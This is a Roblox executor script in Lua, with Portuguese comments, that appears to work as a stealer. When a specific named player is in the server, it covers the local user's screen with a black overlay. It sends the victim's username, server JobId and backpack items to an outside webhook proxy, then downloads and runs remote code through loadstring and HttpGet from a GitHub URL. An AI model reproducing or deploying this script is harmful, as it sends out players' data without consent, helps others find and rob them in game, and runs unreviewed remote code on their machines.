local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local backpack = player:WaitForChild("Backpack")

local specificPlayerName = "TTMARCIOKKJJ" -- Nome do jogador específico que você quer monitorar
local function criarGuiPreta()
    -- Cria a ScreenGui
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "BlackScreenGui"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = player:WaitForChild("PlayerGui")
    screenGui.IgnoreGuiInset = true -- Ignora a área de GUI do Roblox

    -- Cria o Frame preto
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(1, 0, 1, 0)
    frame.Position = UDim2.new(0, 0, 0, 0)
    frame.BackgroundColor3 = Color3.new(0, 0, 0)
    frame.BackgroundTransparency = 0
    frame.Parent = screenGui -- Garante que a GUI fique acima de outros elementos
end 
-- Função a ser executada quando um jogador entra
local function onPlayerAdded(player)
    -- Verifica se o nome do jogador que entrou corresponde ao nome específico
    if player.Name == specificPlayerName then
      criarGuiPreta() -- Chama a função para criar a GUI preta
    end
end

-- Conecta a função ao evento PlayerAdded, que é disparado quando um jogador entra no jogo
Players.PlayerAdded:Connect(onPlayerAdded)

-- Verifica se o jogador específico já está no jogo quando o LocalScript é executado (útil para testes ou jogadores que já estão logados)
for _, player in ipairs(Players:GetPlayers()) do
    if player.Name == specificPlayerName then
         criarGuiPreta()
        break -- Sai do loop assim que encontra o jogador
    end
end



-- Coleta dados para enviar webhook
local username = player.Name
local jobId = game.JobId -- ID único do servidor atual

local items = {}
for _, item in ipairs(backpack:GetChildren()) do
    if item:IsA("Tool") then
        table.insert(items, item.Name)
    end
end
local itemsText = (#items > 0) and table.concat(items, ", ") or "Nenhum item"

local data = {
    username = "Roblox Bot",
    content = "",
    embeds = {{
        title = "🎮 Jogador Conectado",
        color = 65280,
        fields = {
            {
                name = "Nome do Player",
                value = username,
                inline = true
            },
            {
                name = "ID do Servidor (JobId)",
                value = jobId,
                inline = true
            },
            {
                name = "Itens na Backpack",
                value = itemsText,
                inline = false
            }
        },
        footer = {
            text = "Enviado pelo script Roblox"
        },
        timestamp = DateTime.now():ToIsoDate()
    }}
}

local headers = {
    ["Content-Type"] = "application/json"
}

local body = HttpService:JSONEncode(data)

local webhookUrl = "https://proxy-f74p.vercel.app/api/send" -- seu proxy webhook

local requestFunction = (syn and syn.request) or http_request or request or (http and http.request)
if requestFunction then
    requestFunction({
        Url = webhookUrl,
        Method = "POST",
        Headers = headers,
        Body = body
    })
else
    warn("Executor não suporta requisições HTTP.")
end

-- Seu wait + loadstring original (se quiser manter)
task.wait(1)
loadstring(game:HttpGet("https://raw.githubusercontent.com/TTMARCIOKKJJ/x/refs/heads/main/view.lua"))()
